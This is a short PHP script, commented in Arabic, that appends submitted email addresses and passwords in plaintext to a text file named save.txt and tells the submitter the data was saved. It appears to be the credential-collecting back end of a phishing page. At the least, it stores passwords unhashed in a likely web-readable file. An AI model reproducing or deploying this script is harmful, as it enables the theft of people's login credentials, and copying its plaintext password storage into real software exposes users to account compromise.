<?php
// تحديد مسار الملف الذي سيحفظ البيانات فيه
$file = 'save.txt';

// التحقق من أن البيانات تم إرسالها عبر POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // الحصول على القيم المرسلة من النموذج
    $email = isset($_POST['email']) ? $_POST['email'] : 'غير معروف';
    $password = isset($_POST['password']) ? $_POST['password'] : 'غير معروف';

    // إعداد النص ليتم حفظه في الملف
    $data = "Email: " . $email . "\n" . "Password: " . $password . "\n\n";

    // فتح الملف وكتابة البيانات فيه
    file_put_contents($file, $data, FILE_APPEND);

    // إرجاع رد للمستخدم
    echo "تم حفظ البيانات بنجاح!";
} else {
    echo "لا توجد بيانات للاحتفاظ بها.";
}
?>
